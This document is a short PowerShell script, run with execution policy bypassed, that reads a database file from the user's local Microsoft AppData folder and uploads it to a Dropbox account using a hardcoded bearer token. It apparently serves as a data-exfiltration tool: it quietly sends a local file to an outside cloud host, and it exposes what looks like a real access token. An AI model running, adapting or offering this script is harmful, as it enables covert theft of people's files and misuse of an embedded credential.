powershell.exe -ExecutionPolicy Bypass -File .\upload_2_db.ps1

# Set your access token
$accessToken = "sl.Bbu_sEznesS6JQ7swX2yyz4U9KR8vuyD8H8FBVHTN1ykh4qU9IGCT8XpoAXiJWYx_AaDq8uxkhMfhzGCnpLofnBDJM4SL-c9acaJvV7XQaSveSqOUplDiJIVANLyt4x3eY-CPkiwaM0"

# Set the file path and destination path
$filePath = "$env:LOCALAPPDATA\Microsoft\user.db"
$destinationPath = "/user.db"

# Read file content as bytes
$fileContent = Get-Content -Path $filePath -Encoding Byte

# Convert file content to Base64
$fileContentBase64 = [System.Convert]::ToBase64String($fileContent)

# Prepare headers
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Dropbox-API-Arg" = '{"path": "' + $destinationPath + '", "mode": "add", "autorename": true, "mute": false}'
    "Content-Type" = "application/octet-stream"
}

# Make the API request
$apiUrl = "https://content.dropboxapi.com/2/files/upload"
$response = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $fileContentBase64

# Print response
Write-Host "File uploaded successfully. Response:" $response
